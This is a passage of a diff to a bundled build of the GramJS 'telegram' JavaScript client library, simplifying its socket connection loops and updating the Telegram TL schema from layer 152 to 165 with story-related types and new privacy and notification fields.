-    }
     async disconnect() {
+        if (!this._connected) {
+            return;
+        }
         this._connected = false;
-        this._cancelLoops();
-        try {
-            await this.socket.close();
-        }
-        catch (e) {
-            this._log.error("error while closing socket connection");
-        }
+        void this._recvArray.push(undefined);
+        await this.socket.close();
     }
     async send(data) {
         if (!this._connected) {
@@ -53861,7 +54133,8 @@ class Connection {
     async recv() {
         while (this._connected) {
             const result = await this._recvArray.pop();
-            if (result && result.length) {
+            // null = sentinel value = keep trying
+            if (result) {
                 return result;
             }
         }
@@ -53870,46 +54143,37 @@ class Connection {
     async _sendLoop() {
         try {
             while (this._connected) {
-                this.sendCancel = (0, real_cancellable_promise_1.pseudoCancellable)(this._sendArray.pop());
-                const data = await this.sendCancel;
+                const data = await this._sendArray.pop();
                 if (!data) {
-                    continue;
+                    this._sendTask = undefined;
+                    return;
                 }
                 await this._send(data);
             }
         }
         catch (e) {
-            if (e instanceof real_cancellable_promise_1.Cancellation) {
-                return;
-            }
             this._log.info("The server closed the connection while sending");
-            await this.disconnect();
         }
+    }
+    isConnected() {
+        return this._connected;
     }
     async _recvLoop() {
         let data;
         while (this._connected) {
             try {
-                this.recvCancel = (0, real_cancellable_promise_1.pseudoCancellable)(this._recv());
-                data = await this.recvCancel;
+                data = await this._recv();
+                if (!data) {
+                    throw new Error("no data received");
+                }
             }
             catch (e) {
-                if (e instanceof real_cancellable_promise_1.Cancellation) {
-                    return;
-                }
-                this._log.info("The server closed the connection");
-                await this.disconnect();
-                if (!this._recvArray._queue.length) {
-                    await this._recvArray.push(undefined);
-                }
-                break;
+                this._log.info("connection closed");
+                // await this._recvArray.push()
+                this.disconnect();
+                return;
             }
-            try {
-                await this._recvArray.push(data);
-            }
-            catch (e) {
-                break;
-            }
+            await this._recvArray.push(data);
         }
     }
     async _initConn() {
@@ -55215,7 +55479,7 @@ exports.LocalStorage = __webpack_require__(/*! node-localstorage */ "./node_modu
 
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.tlobjects = exports.LAYER = void 0;
-exports.LAYER = 152;
+exports.LAYER = 165;
 const _1 = __webpack_require__(/*! ./ */ "./node_modules/telegram/tl/index.js");
 const tlobjects = {};
 exports.tlobjects = tlobjects;
@@ -55759,8 +56023,7 @@ module.exports = { Api: api };
 
 "use strict";
 
-module.exports = `
-boolFalse#bc799737 = Bool;
+module.exports = `boolFalse#bc799737 = Bool;
 boolTrue#997275b5 = Bool;
 true#3fedd339 = True;
 vector#1cb5c415 {t:Type} # [ t ] = Vector t;
@@ -55795,6 +56058,7 @@ inputMediaInvoice#8eb5a6d5 flags:# title:string description:string photo:flags.0
 inputMediaGeoLive#971fa843 flags:# stopped:flags.0?true geo_point:InputGeoPoint heading:flags.2?int period:flags.1?int proximity_notification_radius:flags.3?int = InputMedia;
 inputMediaPoll#f94e5f1 flags:# poll:Poll correct_answers:flags.0?Vector<bytes> solution:flags.1?string solution_entities:flags.1?Vector<MessageEntity> = InputMedia;
 inputMediaDice#e66fbf7b emoticon:string = InputMedia;
+inputMediaStory#89fdd778 peer:InputPeer id:int = InputMedia;
 inputChatPhotoEmpty#1ca48f57 = InputChatPhoto;
 inputChatUploadedPhoto#bdcdaec0 flags:# file:flags.0?InputFile video:flags.1?InputFile video_start_ts:flags.2?double video_emoji_markup:flags.3?VideoSize = InputChatPhoto;
 inputChatPhoto#8953ad37 id:InputPhoto = InputChatPhoto;
@@ -55826,7 +56090,7 @@ storage.fileMov#4b09ebbc = storage.FileType;
 storage.fileMp4#b3cea0e4 = storage.FileType;
 storage.fileWebp#1081464c = storage.FileType;
 userEmpty#d3bc4b7a id:long = User;
-user#8f97c628 flags:# self:flags.10?true contact:flags.11?true mutual_contact:flags.12?true deleted:flags.13?true bot:flags.14?true bot_chat_history:flags.15?true bot_nochats:flags.16?true verified:flags.17?true restricted:flags.18?true min:flags.20?true bot_inline_geo:flags.21?true support:flags.23?true scam:flags.24?true apply_min_photo:flags.25?true fake:flags.26?true bot_attach_menu:flags.27?true premium:flags.28?true attach_menu_enabled:flags.29?true flags2:# id:long access_hash:flags.0?long first_name:flags.1?string last_name:flags.2?string username:flags.3?string phone:flags.4?string photo:flags.5?UserProfilePhoto status:flags.6?UserStatus bot_info_version:flags.14?int restriction_reason:flags.18?Vector<RestrictionReason> bot_inline_placeholder:flags.19?string lang_code:flags.22?string emoji_status:flags.30?EmojiStatus usernames:flags2.0?Vector<Username> = User;
+user#abb5f120 flags:# self:flags.10?true contact:flags.11?true mutual_contact:flags.12?true deleted:flags.13?true bot:flags.14?true bot_chat_history:flags.15?true bot_nochats:flags.16?true verified:flags.17?true restricted:flags.18?true min:flags.20?true bot_inline_geo:flags.21?true support:flags.23?true scam:flags.24?true apply_min_photo:flags.25?true fake:flags.26?true bot_attach_menu:flags.27?true premium:flags.28?true attach_menu_enabled:flags.29?true flags2:# bot_can_edit:flags2.1?true close_friend:flags2.2?true stories_hidden:flags2.3?true stories_unavailable:flags2.4?true id:long access_hash:flags.0?long first_name:flags.1?string last_name:flags.2?string username:flags.3?string phone:flags.4?string photo:flags.5?UserProfilePhoto status:flags.6?UserStatus bot_info_version:flags.14?int restriction_reason:flags.18?Vector<RestrictionReason> bot_inline_placeholder:flags.19?string lang_code:flags.22?string emoji_status:flags.30?EmojiStatus usernames:flags2.0?Vector<Username> stories_max_id:flags2.5?int = User;
 userProfilePhotoEmpty#4f11bae1 = UserProfilePhoto;
 userProfilePhoto#82d1f706 flags:# has_video:flags.0?true personal:flags.2?true photo_id:long stripped_thumb:flags.1?bytes dc_id:int = UserProfilePhoto;
 userStatusEmpty#9d05049 = UserStatus;
@@ -55838,10 +56102,10 @@ userStatusLastMonth#77ebc742 = UserStatus;
 chatEmpty#29562865 id:long = Chat;
 chat#41cbf256 flags:# creator:flags.0?true left:flags.2?true deactivated:flags.5?true call_active:flags.23?true call_not_empty:flags.24?true noforwards:flags.25?true id:long title:string photo:ChatPhoto participants_count:int date:int version:int migrated_to:flags.6?InputChannel admin_rights:flags.14?ChatAdminRights default_banned_rights:flags.18?ChatBannedRights = Chat;
 chatForbidden#6592a1a7 id:long title:string = Chat;
-channel#83259464 flags:# creator:flags.0?true left:flags.2?true broadcast:flags.5?true verified:flags.7?true megagroup:flags.8?true restricted:flags.9?true signatures:flags.11?true min:flags.12?true scam:flags.19?true has_link:flags.20?true has_geo:flags.21?true slowmode_enabled:flags.22?true call_active:flags.23?true call_not_empty:flags.24?true fake:flags.25?true gigagroup:flags.26?true noforwards:flags.27?true join_to_send:flags.28?true join_request:flags.29?true forum:flags.30?true flags2:# id:long access_hash:flags.13?long title:string username:flags.6?string photo:ChatPhoto date:int restriction_reason:flags.9?Vector<RestrictionReason> admin_rights:flags.14?ChatAdminRights banned_rights:flags.15?ChatBannedRights default_banned_rights:flags.18?ChatBannedRights participants_count:flags.17?int usernames:flags2.0?Vector<Username> = Chat;
+channel#94f592db flags:# creator:flags.0?true left:flags.2?true broadcast:flags.5?true verified:flags.7?true megagroup:flags.8?true restricted:flags.9?true signatures:flags.11?true min:flags.12?true scam:flags.19?true has_link:flags.20?true has_geo:flags.21?true slowmode_enabled:flags.22?true call_active:flags.23?true call_not_empty:flags.24?true fake:flags.25?true gigagroup:flags.26?true noforwards:flags.27?true join_to_send:flags.28?true join_request:flags.29?true forum:flags.30?true flags2:# stories_hidden:flags2.1?true stories_hidden_min:flags2.2?true stories_unavailable:flags2.3?true id:long access_hash:flags.13?long title:string username:flags.6?string photo:ChatPhoto date:int restriction_reason:flags.9?Vector<RestrictionReason> admin_rights:flags.14?ChatAdminRights banned_rights:flags.15?ChatBannedRights default_banned_rights:flags.18?ChatBannedRights participants_count:flags.17?int usernames:flags2.0?Vector<Username> stories_max_id:flags2.4?int = Chat;
 channelForbidden#17d493d5 flags:# broadcast:flags.5?true megagroup:flags.8?true id:long access_hash:long title:string until_date:flags.16?int = Chat;
 chatFull#c9d31138 flags:# can_set_username:flags.7?true has_scheduled:flags.8?true translations_disabled:flags.19?true id:long about:string participants:ChatParticipants chat_photo:flags.2?Photo notify_settings:PeerNotifySettings exported_invite:flags.13?ExportedChatInvite bot_info:flags.3?Vector<BotInfo> pinned_msg_id:flags.6?int folder_id:flags.11?int call:flags.12?InputGroupCall ttl_period:flags.14?int groupcall_default_join_as:flags.15?Peer theme_emoticon:flags.16?string requests_pending:flags.17?int recent_requesters:flags.17?Vector<long> available_reactions:flags.18?ChatReactions = ChatFull;
-channelFull#f2355507 flags:# can_view_participants:flags.3?true can_set_username:flags.6?true can_set_stickers:flags.7?true hidden_prehistory:flags.10?true can_set_location:flags.16?true has_scheduled:flags.19?true can_view_stats:flags.20?true blocked:flags.22?true flags2:# can_delete_channel:flags2.0?true antispam:flags2.1?true participants_hidden:flags2.2?true translations_disabled:flags2.3?true id:long about:string participants_count:flags.0?int admins_count:flags.1?int kicked_count:flags.2?int banned_count:flags.2?int online_count:flags.13?int read_inbox_max_id:int read_outbox_max_id:int unread_count:int chat_photo:Photo notify_settings:PeerNotifySettings exported_invite:flags.23?ExportedChatInvite bot_info:Vector<BotInfo> migrated_from_chat_id:flags.4?long migrated_from_max_id:flags.4?int pinned_msg_id:flags.5?int stickerset:flags.8?StickerSet available_min_id:flags.9?int folder_id:flags.11?int linked_chat_id:flags.14?long location:flags.15?ChannelLocation slowmode_seconds:flags.17?int slowmode_next_send_date:flags.18?int stats_dc:flags.12?int pts:int call:flags.21?InputGroupCall ttl_period:flags.24?int pending_suggestions:flags.25?Vector<string> groupcall_default_join_as:flags.26?Peer theme_emoticon:flags.27?string requests_pending:flags.28?int recent_requesters:flags.28?Vector<long> default_send_as:flags.29?Peer available_reactions:flags.30?ChatReactions = ChatFull;
+channelFull#723027bd flags:# can_view_participants:flags.3?true can_set_username:flags.6?true can_set_stickers:flags.7?true hidden_prehistory:flags.10?true can_set_location:flags.16?true has_scheduled:flags.19?true can_view_stats:flags.20?true blocked:flags.22?true flags2:# can_delete_channel:flags2.0?true antispam:flags2.1?true participants_hidden:flags2.2?true translations_disabled:flags2.3?true stories_pinned_available:flags2.5?true id:long about:string participants_count:flags.0?int admins_count:flags.1?int kicked_count:flags.2?int banned_count:flags.2?int online_count:flags.13?int read_inbox_max_id:int read_outbox_max_id:int unread_count:int chat_photo:Photo notify_settings:PeerNotifySettings exported_invite:flags.23?ExportedChatInvite bot_info:Vector<BotInfo> migrated_from_chat_id:flags.4?long migrated_from_max_id:flags.4?int pinned_msg_id:flags.5?int stickerset:flags.8?StickerSet available_min_id:flags.9?int folder_id:flags.11?int linked_chat_id:flags.14?long location:flags.15?ChannelLocation slowmode_seconds:flags.17?int slowmode_next_send_date:flags.18?int stats_dc:flags.12?int pts:int call:flags.21?InputGroupCall ttl_period:flags.24?int pending_suggestions:flags.25?Vector<string> groupcall_default_join_as:flags.26?Peer theme_emoticon:flags.27?string requests_pending:flags.28?int recent_requesters:flags.28?Vector<long> default_send_as:flags.29?Peer available_reactions:flags.30?ChatReactions stories:flags2.4?PeerStories = ChatFull;
 chatParticipant#c02d4007 user_id:long inviter_id:long date:int = ChatParticipant;
 chatParticipantCreator#e46bcee4 user_id:long = ChatParticipant;
 chatParticipantAdmin#a0933f5b user_id:long inviter_id:long date:int = ChatParticipant;
@@ -55857,7 +56121,7 @@ messageMediaPhoto#695150d7 flags:# spoiler:flags.3?true photo:flags.0?Photo ttl_
 messageMediaGeo#56e0d474 geo:GeoPoint = MessageMedia;
 messageMediaContact#70322949 phone_number:string first_name:string last_name:string vcard:string user_id:long = MessageMedia;
 messageMediaUnsupported#9f84f49e = MessageMedia;
-messageMediaDocument#9cb070d7 flags:# nopremium:flags.3?true spoiler:flags.4?true document:flags.0?Document ttl_seconds:flags.2?int = MessageMedia;
+messageMediaDocument#4cf4d72d flags:# nopremium:flags.3?true spoiler:flags.4?true document:flags.0?Document alt_document:flags.5?Document ttl_seconds:flags.2?int = MessageMedia;
 messageMediaWebPage#a32dd600 webpage:WebPage = MessageMedia;
 messageMediaVenue#2ec0533f geo:GeoPoint title:string address:string provider:string venue_id:string venue_type:string = MessageMedia;
 messageMediaGame#fdb19008 game:Game = MessageMedia;
@@ -55865,6 +56129,7 @@ messageMediaInvoice#f6a548d3 flags:# shipping_address_requested:flags.1?true tes
 messageMediaGeoLive#b940c666 flags:# geo:GeoPoint heading:flags.0?int period:int proximity_notification_radius:flags.1?int = MessageMedia;
 messageMediaPoll#4bd6e798 poll:Poll results:PollResults = MessageMedia;
 messageMediaDice#3f7ee58b value:int emoticon:string = MessageMedia;
+messageMediaStory#68cb6283 flags:# via_mention:flags.1?true peer:Peer id:int story:flags.0?StoryItem = MessageMedia;
 messageActionEmpty#b6aef7b0 = MessageAction;
 messageActionChatCreate#bd47cbad title:string users:Vector<long> = MessageAction;
 messageActionChatEditTitle#b5a1ce5a title:string = MessageAction;
@@ -55884,7 +56149,7 @@ messageActionPaymentSent#96163f56 flags:# recurring_init:flags.2?true recurring_
 messageActionPhoneCall#80e11a7f flags:# video:flags.2?true call_id:long reason:flags.0?PhoneCallDiscardReason duration:flags.1?int = MessageAction;
 messageActionScreenshotTaken#4792929b = MessageAction;
 messageActionCustomAction#fae69f56 message:string = MessageAction;
-messageActionBotAllowed#abe9affe domain:string = MessageAction;
+messageActionBotAllowed#c516d679 flags:# attach_menu:flags.1?true from_request:flags.3?true domain:flags.0?string app:flags.2?BotApp = MessageAction;
 messageActionSecureValuesSentMe#1b287353 values:Vector<SecureValue> credentials:SecureCredentialsEncrypted = MessageAction;
 messageActionSecureValuesSent#d95c6154 types:Vector<SecureValueType> = MessageAction;
 messageActionContactSignUp#f3f25f76 = MessageAction;
@@ -55897,12 +56162,13 @@ messageActionSetChatTheme#aa786345 emoticon:string = MessageAction;
 messageActionChatJoinedByRequest#ebbca3cb = MessageAction;
 messageActionWebViewDataSentMe#47dd8079 text:string data:string = MessageAction;
 messageActionWebViewDataSent#b4c38cb5 text:string = MessageAction;
-messageActionGiftPremium#aba0f5c6 currency:string amount:long months:int = MessageAction;
+messageActionGiftPremium#c83d6aec flags:# currency:string amount:long months:int crypto_currency:flags.0?string crypto_amount:flags.0?long = MessageAction;
 messageActionTopicCreate#d999256 flags:# title:string icon_color:int icon_emoji_id:flags.0?long = MessageAction;
 messageActionTopicEdit#c0944820 flags:# title:flags.0?string icon_emoji_id:flags.1?long closed:flags.2?Bool hidden:flags.3?Bool = MessageAction;
 messageActionSuggestProfilePhoto#57de635e photo:Photo = MessageAction;
-messageActionAttachMenuBotAllowed#e7e75f97 = MessageAction;
 messageActionRequestedPeer#fe77345d button_id:int peer:Peer = MessageAction;
+messageActionSetChatWallPaper#bc44a927 wallpaper:WallPaper = MessageAction;
+messageActionSetSameChatWallPaper#c0787d6d wallpaper:WallPaper = MessageAction;
 dialog#d58a08c6 flags:# pinned:flags.2?true unread_mark:flags.3?true peer:Peer top_message:int read_inbox_max_id:int read_outbox_max_id:int unread_count:int unread_mentions_count:int unread_reactions_count:int notify_settings:PeerNotifySettings pts:flags.0?int draft:flags.1?DraftMessage folder_id:flags.4?int ttl_period:flags.5?int = Dialog;
 dialogFolder#71bd134c flags:# pinned:flags.2?true folder:Folder peer:Peer top_message:int unread_muted_peers_count:int unread_unmuted_peers_count:int unread_muted_messages_count:int unread_unmuted_messages_count:int = Dialog;
 photoEmpty#2331b22d id:long = Photo;
@@ -55925,8 +56191,8 @@ inputNotifyUsers#193b4417 = InputNotifyPeer;
 inputNotifyChats#4a95e84e = InputNotifyPeer;
 inputNotifyBroadcasts#b1db7c7e = InputNotifyPeer;
 inputNotifyForumTopic#5c467992 peer:InputPeer top_msg_id:int = InputNotifyPeer;
-inputPeerNotifySettings#df1f002b flags:# show_previews:flags.0?Bool silent:flags.1?Bool mute_until:flags.2?int sound:flags.3?NotificationSound = InputPeerNotifySettings;
-peerNotifySettings#a83b0426 flags:# show_previews:flags.0?Bool silent:flags.1?Bool mute_until:flags.2?int ios_sound:flags.3?NotificationSound android_sound:flags.4?NotificationSound other_sound:flags.5?NotificationSound = PeerNotifySettings;
+inputPeerNotifySettings#cacb6ae2 flags:# show_previews:flags.0?Bool silent:flags.1?Bool mute_until:flags.2?int sound:flags.3?NotificationSound stories_muted:flags.6?Bool stories_hide_sender:flags.7?Bool stories_sound:flags.8?NotificationSound = InputPeerNotifySettings;
+peerNotifySettings#99622c0c flags:# show_previews:flags.0?Bool silent:flags.1?Bool mute_until:flags.2?int ios_sound:flags.3?NotificationSound android_sound:flags.4?NotificationSound other_sound:flags.5?NotificationSound stories_muted:flags.6?Bool stories_hide_sender:flags.7?Bool stories_ios_sound:flags.8?NotificationSound stories_android_sound:flags.9?NotificationSound stories_other_sound:flags.10?NotificationSound = PeerNotifySettings;
 peerSettings#a518110d flags:# report_spam:flags.0?true add_contact:flags.1?true block_contact:flags.2?true share_contact:flags.3?true need_contacts_exception:flags.4?true report_geo:flags.5?true autoarchived:flags.7?true invite_members:flags.8?true request_chat_broadcast:flags.10?true geo_distance:flags.6?int request_chat_title:flags.9?string request_chat_date:flags.9?int = PeerSettings;
 wallPaper#a437c3ed id:long flags:# creator:flags.0?true default:flags.1?true pattern:flags.3?true dark:flags.4?true access_hash:long slug:string document:Document settings:flags.2?WallPaperSettings = WallPaper;
 wallPaperNoFile#e0804116 id:long flags:# default:flags.1?true dark:flags.4?true settings:flags.2?WallPaperSettings = WallPaper;
@@ -55940,7 +56206,7 @@ inputReportReasonGeoIrrelevant#dbd4feed = ReportReason;
 inputReportReasonFake#f5ddd6e7 = ReportReason;
 inputReportReasonIllegalDrugs#a8eb2be = ReportReason;
 inputReportReasonPersonalDetails#9ec7863d = ReportReason;
-userFull#f8d32aed flags:# blocked:flags.0?true phone_calls_available:flags.4?true phone_calls_private:flags.5?true can_pin_message:flags.7?true has_scheduled:flags.12?true video_calls_available:flags.13?true voice_messages_forbidden:flags.20?true translations_disabled:flags.23?true id:long about:flags.1?string settings:PeerSettings personal_photo:flags.21?Photo profile_photo:flags.2?Photo fallback_photo:flags.22?Photo notify_settings:PeerNotifySettings bot_info:flags.3?BotInfo pinned_msg_id:flags.6?int common_chats_count:int folder_id:flags.11?int ttl_period:flags.14?int theme_emoticon:flags.15?string private_forward_name:flags.16?string bot_group_admin_rights:flags.17?ChatAdminRights bot_broadcast_admin_rights:flags.18?ChatAdminRights premium_gifts:flags.19?Vector<PremiumGiftOption> = UserFull;
+userFull#b9b12c6c flags:# blocked:flags.0?true phone_calls_available:flags.4?true phone_calls_private:flags.5?true can_pin_message:flags.7?true has_scheduled:flags.12?true video_calls_available:flags.13?true voice_messages_forbidden:flags.20?true translations_disabled:flags.23?true stories_pinned_available:flags.26?true blocked_my_stories_from:flags.27?true id:long about:flags.1?string settings:PeerSettings personal_photo:flags.21?Photo profile_photo:flags.2?Photo fallback_photo:flags.22?Photo notify_settings:PeerNotifySettings bot_info:flags.3?BotInfo pinned_msg_id:flags.6?int common_chats_count:int folder_id:flags.11?int ttl_period:flags.14?int theme_emoticon:flags.15?string private_forward_name:flags.16?string bot_group_admin_rights:flags.17?ChatAdminRights bot_broadcast_admin_rights:flags.18?ChatAdminRights premium_gifts:flags.19?Vector<PremiumGiftOption> wallpaper:flags.24?WallPaper stories:flags.25?PeerStories = UserFull;
 contact#145ade0b user_id:long mutual:Bool = Contact;
 importedContact#c13e3c50 user_id:long client_id:long = ImportedContact;
 contactStatus#16d9703b user_id:long status:UserStatus = ContactStatus;
@@ -55985,6 +56251,7 @@ updateChatUserTyping#83487af0 chat_id:long from_id:Peer action:SendMessageAction
 updateChatParticipants#7761198 participants:ChatParticipants = Update;
 updateUserStatus#e5bdf8de user_id:long status:UserStatus = Update;
 updateUserName#a7848924 user_id:long first_name:string last_name:string usernames:Vector<Username> = Update;
+updateNewAuthorization#8951abef flags:# unconfirmed:flags.0?true hash:long date:flags.0?int device:flags.0?string location:flags.0?string = Update;
 updateNewEncryptedMessage#12bcbd9a message:EncryptedMessage qts:int = Update;
 updateEncryptedChatTyping#1710f156 chat_id:int = Update;
 updateEncryption#b4a2e88d chat:EncryptedChat date:int = Update;
@@ -55999,7 +56266,7 @@ updateUserPhone#5492a13 user_id:long phone:string = Update;
 updateReadHistoryInbox#9c974fdf flags:# folder_id:flags.0?int peer:Peer max_id:int still_unread_count:int pts:int pts_count:int = Update;
 updateReadHistoryOutbox#2f2f21bf peer:Peer max_id:int pts:int pts_count:int = Update;
 updateWebPage#7f891213 webpage:WebPage pts:int pts_count:int = Update;
-updateReadMessagesContents#68c13933 messages:Vector<int> pts:int pts_count:int = Update;
+updateReadMessagesContents#f8227181 flags:# messages:Vector<int> pts:int pts_count:int date:flags.0?int = Update;
 updateChannelTooLong#108d941f flags:# channel_id:long pts:flags.0?int = Update;
 updateChannel#635b4c09 channel_id:long = Update;
 updateNewChannelMessage#62ba04d9 message:Message pts:int pts_count:int = Update;
@@ -56048,7 +56315,7 @@ updateDeleteScheduledMessages#90866cee peer:Peer messages:Vector<int> = Update;
 updateTheme#8216fba3 theme:Theme = Update;
 updateGeoLiveViewed#871fb939 peer:Peer msg_id:int = Update;
 updateLoginToken#564fe691 = Update;
-updateMessagePollVote#106395c9 poll_id:long user_id:long options:Vector<bytes> qts:int = Update;
+updateMessagePollVote#24f40e77 poll_id:long peer:Peer options:Vector<bytes> qts:int = Update;
 updateDialogFilter#26ffde7d flags:# id:int filter:flags.0?DialogFilter = Update;
 updateDialogFilterOrder#a5d72105 order:Vector<int> = Update;
 updateDialogFilters#3504914f = Update;
@@ -56056,7 +56323,7 @@ updatePhoneCallSignalingData#2661bf09 phone_call_id:long data:bytes = Update;
 updateChannelMessageForwards#d29a27f4 channel_id:long id:int forwards:int = Update;
 updateReadChannelDiscussionInbox#d6b19546 flags:# channel_id:long top_msg_id:int read_max_id:int broadcast_id:flags.0?long broadcast_post:flags.0?int = Update;
 updateReadChannelDiscussionOutbox#695c9e7c channel_id:long top_msg_id:int read_max_id:int = Update;
-updatePeerBlocked#246a4b22 peer_id:Peer blocked:Bool = Update;
+updatePeerBlocked#ebe07752 flags:# blocked:flags.0?true blocked_my_stories_from:flags.1?true peer_id:Peer = Update;
 updateChannelUserTyping#8c88c923 flags:# channel_id:long top_msg_id:flags.0?int from_id:Peer action:SendMessageAction = Update;
 updatePinnedMessages#ed85eab5 flags:# pinned:flags.0?true peer:Peer messages:Vector<int> pts:int pts_count:int = Update;
 updatePinnedChannelMessages#5bb98608 flags:# pinned:flags.0?true channel_id:long messages:Vector<int> pts:int pts_count:int = Update;
@@ -56065,7 +56332,7 @@ updateGroupCallParticipants#f2ebdb4e call:InputGroupCall participants:Vector<Gro
 updateGroupCall#14b24500 chat_id:long call:GroupCall = Update;
 updatePeerHistoryTTL#bb9bb9a5 flags:# peer:Peer ttl_period:flags.0?int = Update;
 updateChatParticipant#d087663a flags:# chat_id:long date:int actor_id:long user_id:long prev_participant:flags.0?ChatParticipant new_participant:flags.1?ChatParticipant invite:flags.2?ExportedChatInvite qts:int = Update;
-updateChannelParticipant#985d3abb flags:# channel_id:long date:int actor_id:long user_id:long prev_participant:flags.0?ChannelParticipant new_participant:flags.1?ChannelParticipant invite:flags.2?ExportedChatInvite qts:int = Update;
+updateChannelParticipant#985d3abb flags:# via_chatlist:flags.3?true channel_id:long date:int actor_id:long user_id:long prev_participant:flags.0?ChannelParticipant new_participant:flags.1?ChannelParticipant invite:flags.2?ExportedChatInvite qts:int = Update;
 updateBotStopped#c4870a49 user_id:long date:int stopped:Bool qts:int = Update;
 updateGroupCallConnection#b783982 flags:# presentation:flags.0?true params:DataJSON = Update;
 updateBotCommands#4d712f2e peer:Peer bot_id:long commands:Vector<BotCommand> = Update;
@@ -56087,6 +56354,12 @@ updateChannelPinnedTopic#192efbe3 flags:# pinned:flags.0?true channel_id:long to
 updateChannelPinnedTopics#fe198602 flags:# channel_id:long order:flags.0?Vector<int> = Update;
 updateUser#20529438 user_id:long = Update;
 updateAutoSaveSettings#ec05b097 = Update;
+updateGroupInvitePrivacyForbidden#ccf08ad6 user_id:long = Update;
+updateStory#75b3b798 peer:Peer story:StoryItem = Update;
+updateReadStories#f74e932b peer:Peer max_id:int = Update;
+updateStoryID#1bf335b9 id:int random_id:long = Update;
+updateStoriesStealthMode#2c084dc1 stealth_mode:StoriesStealthMode = Update;
+updateSentStoryReaction#7d627683 peer:Peer story_id:int reaction:Reaction = Update;
 updates.state#a56c2a3e pts:int qts:int date:int seq:int unread_count:int = updates.State;
 updates.differenceEmpty#5d75a138 date:int seq:int = updates.Difference;
 updates.difference#f49ca0 new_messages:Vector<Message> new_encrypted_messages:Vector<EncryptedMessage> other_updates:Vector<Update> chats:Vector<Chat> users:Vector<User> state:updates.State = updates.Difference;
@@ -56105,7 +56378,7 @@ photos.photo#20212ca8 photo:Photo users:Vector<User> = photos.Photo;
 upload.file#96a18d5 type:storage.FileType mtime:int bytes:bytes = upload.File;
 upload.fileCdnRedirect#f18cda44 dc_id:int file_token:bytes encryption_key:bytes encryption_iv:bytes file_hashes:Vector<FileHash> = upload.File;
 dcOption#18b7a10d flags:# ipv6:flags.0?true media_only:flags.1?true tcpo_only:flags.2?true cdn:flags.3?true static:flags.4?true this_port_only:flags.5?true id:int ip_address:string port:int secret:flags.10?bytes = DcOption;
-config#232566ac flags:# phonecalls_enabled:flags.1?true default_p2p_contacts:flags.3?true preload_featured_stickers:flags.4?true ignore_phone_entities:flags.5?true revoke_pm_inbox:flags.6?true blocked_mode:flags.8?true pfs_enabled:flags.13?true force_try_ipv6:flags.14?true date:int expires:int test_mode:Bool this_dc:int dc_options:Vector<DcOption> dc_txt_domain_name:string chat_size_max:int megagroup_size_max:int forwarded_count_max:int online_update_period_ms:int offline_blur_timeout_ms:int offline_idle_timeout_ms:int online_cloud_timeout_ms:int notify_cloud_delay_ms:int notify_default_delay_ms:int push_chat_period_ms:int push_chat_limit:int saved_gifs_limit:int edit_time_limit:int revoke_time_limit:int revoke_pm_time_limit:int rating_e_decay:int stickers_recent_limit:int stickers_faved_limit:int channels_read_media_period:int tmp_sessions:flags.0?int pinned_dialogs_count_max:int pinned_infolder_count_max:int call_receive_timeout_ms:int call_ring_timeout_ms:int call_connect_timeout_ms:int call_packet_timeout_ms:int me_url_prefix:string autoupdate_url_prefix:flags.7?string gif_search_username:flags.9?string venue_search_username:flags.10?string img_search_username:flags.11?string static_maps_provider:flags.12?string caption_length_max:int message_length_max:int webfile_dc_id:int suggested_lang_code:flags.2?string lang_pack_version:flags.2?int base_lang_pack_version:flags.2?int reactions_default:flags.15?Reaction = Config;
+config#cc1a241e flags:# default_p2p_contacts:flags.3?true preload_featured_stickers:flags.4?true revoke_pm_inbox:flags.6?true blocked_mode:flags.8?true force_try_ipv6:flags.14?true date:int expires:int test_mode:Bool this_dc:int dc_options:Vector<DcOption> dc_txt_domain_name:string chat_size_max:int megagroup_size_max:int forwarded_count_max:int online_update_period_ms:int offline_blur_timeout_ms:int offline_idle_timeout_ms:int online_cloud_timeout_ms:int notify_cloud_delay_ms:int notify_default_delay_ms:int push_chat_period_ms:int push_chat_limit:int edit_time_limit:int revoke_time_limit:int revoke_pm_time_limit:int rating_e_decay:int stickers_recent_limit:int channels_read_media_period:int tmp_sessions:flags.0?int call_receive_timeout_ms:int call_ring_timeout_ms:int call_connect_timeout_ms:int call_packet_timeout_ms:int me_url_prefix:string autoupdate_url_prefix:flags.7?string gif_search_username:flags.9?string venue_search_username:flags.10?string img_search_username:flags.11?string static_maps_provider:flags.12?string caption_length_max:int message_length_max:int webfile_dc_id:int suggested_lang_code:flags.2?string lang_pack_version:flags.2?int base_lang_pack_version:flags.2?int reactions_default:flags.15?Reaction autologin_token:flags.16?string = Config;
 nearestDc#8e1a1775 country:string this_dc:int nearest_dc:int = NearestDc;
 help.appUpdate#ccbbce30 flags:# can_not_skip:flags.0?true id:int version:string text:string entities:Vector<MessageEntity> document:flags.1?Document url:flags.2?string sticker:flags.3?Document = help.AppUpdate;
 help.noAppUpdate#c45a6536 = help.AppUpdate;
@@ -56166,6 +56439,7 @@ inputPrivacyKeyProfilePhoto#5719bacc = InputPrivacyKey;
 inputPrivacyKeyPhoneNumber#352dafa = InputPrivacyKey;
 inputPrivacyKeyAddedByPhone#d1219bdd = InputPrivacyKey;
 inputPrivacyKeyVoiceMessages#aee69d68 = InputPrivacyKey;
+inputPrivacyKeyAbout#3823cc40 = InputPrivacyKey;
 privacyKeyStatusTimestamp#bc2eab30 = PrivacyKey;
 privacyKeyChatInvite#500e6dfa = PrivacyKey;
 privacyKeyPhoneCall#3d662b7b = PrivacyKey;
@@ -56175,6 +56449,7 @@ privacyKeyProfilePhoto#96151fed = PrivacyKey;
 privacyKeyPhoneNumber#d19ae46d = PrivacyKey;
 privacyKeyAddedByPhone#42ffd42b = PrivacyKey;
 privacyKeyVoiceMessages#697f414 = PrivacyKey;
+privacyKeyAbout#a486b761 = PrivacyKey;
 inputPrivacyValueAllowContacts#d09e07b = InputPrivacyRule;
 inputPrivacyValueAllowAll#184b35ce = InputPrivacyRule;
 inputPrivacyValueAllowUsers#131cc67f users:Vector<InputUser> = InputPrivacyRule;
@@ -56183,6 +56458,7 @@ inputPrivacyValueDisallowAll#d66b66c9 = InputPrivacyRule;
 inputPrivacyValueDisallowUsers#90110467 users:Vector<InputUser> = InputPrivacyRule;
 inputPrivacyValueAllowChatParticipants#840649cf chats:Vector<long> = InputPrivacyRule;
 inputPrivacyValueDisallowChatParticipants#e94f0f86 chats:Vector<long> = InputPrivacyRule;
+inputPrivacyValueAllowCloseFriends#2f453e49 = InputPrivacyRule;
 privacyValueAllowContacts#fffe1bac = PrivacyRule;
 privacyValueAllowAll#65427b82 = PrivacyRule;
 privacyValueAllowUsers#b8905fb2 users:Vector<long> = PrivacyRule;
